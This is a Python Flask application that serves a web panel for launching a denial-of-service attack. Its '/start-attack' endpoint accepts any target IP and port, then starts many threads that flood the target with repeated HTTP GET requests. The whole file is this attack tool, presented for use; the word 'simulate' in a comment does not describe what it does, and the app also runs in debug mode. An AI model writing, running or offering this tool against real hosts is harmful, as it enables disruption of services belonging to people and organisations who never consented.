from flask import Flask, Blueprint, render_template, request, jsonify
import threading
import requests
import time

# Initialize Flask app
app = Flask(__name__)

# Define the Blueprint
dos_app = Blueprint('dos_app', __name__)

# Global variables to store attack details
attack_details = {
    "target_ip": None,
    "port": None,
    "num_pcs": 0,
    "num_requests": 0
}

# Function to simulate sending requests with retry mechanism
def send_requests_for_pc(pc_id):
    target_url = f"http://{attack_details['target_ip']}:{attack_details['port']}/"
    for _ in range(int(attack_details['num_requests'])):
        try:
            response = requests.get(target_url, timeout=5)  # Added timeout for requests
            print(f"PC {pc_id}: Request sent to {target_url}, Status Code: {response.status_code}")
        except requests.exceptions.Timeout:
            print(f"PC {pc_id}: Request to {target_url} timed out.")
        except Exception as e:
            print(f"PC {pc_id}: Error sending request: {e}")

# Function to initiate the attack with multiple threads
def send_requests():
    threads = []
    for pc_id in range(1, int(attack_details['num_pcs']) + 1):
        thread = threading.Thread(target=send_requests_for_pc, args=(pc_id,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Route for displaying the main page
@dos_app.route('/')
def index():
    return render_template('dos_index.html')

# Route to start the attack
@dos_app.route('/start-attack', methods=['POST'])
def start_attack():
    global attack_details

    # Get attack details from the request
    try:
        attack_details['target_ip'] = request.json.get('target_ip')
        attack_details['port'] = int(request.json.get('port'))
        attack_details['num_pcs'] = int(request.json.get('num_pcs'))
        attack_details['num_requests'] = int(request.json.get('num_requests'))
    except ValueError as e:
        return jsonify({"message": f"Invalid input: {e}"}), 400

    # Start the attack in a separate thread
    thread = threading.Thread(target=send_requests)
    thread.start()

    return jsonify({"message": "Attack started!"})

# Register the Blueprint with the Flask app
app.register_blueprint(dos_app, url_prefix='/dos')

# Run the Flask app
if __name__ == '__main__':
    app.run(debug=True)
